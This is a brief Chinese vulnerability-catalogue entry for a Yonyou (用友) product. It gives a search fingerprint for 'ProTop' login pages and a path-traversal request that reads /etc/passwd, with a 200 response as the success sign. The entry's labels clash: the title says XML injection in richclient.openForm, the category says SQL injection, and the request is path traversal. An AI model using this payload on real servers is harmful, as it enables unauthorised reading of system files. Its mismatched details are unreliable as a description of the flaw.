# 时空用友-richclient.openForm存在xml注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`body="<title>ProTop"`
- **请求**：`GET /pt3upd/..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1`
- **响应特征**：200